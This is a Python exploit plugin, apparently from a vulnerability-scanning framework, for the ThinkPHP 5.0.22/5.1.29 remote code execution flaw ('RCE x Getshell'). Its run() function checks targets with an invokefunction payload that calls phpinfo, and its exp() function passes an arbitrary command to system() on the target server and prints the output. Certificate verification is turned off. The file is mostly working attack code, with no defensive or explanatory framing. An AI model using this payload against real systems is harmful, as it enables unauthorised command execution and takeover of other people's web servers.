#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'ThinkPHP 5.0.22/5.1.29-RCE x Getshell',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = f'/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "phpinfo()" in res.text:
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret
def exp(url,ua,cmd):
  headers = {
      'User-Agent': ua,
      }
  target = f'/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={cmd}'
  url1 = url + target
  print(url1)
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    print('返回值：\n')
    print(res.text)
  except:
    print('连接失败！')


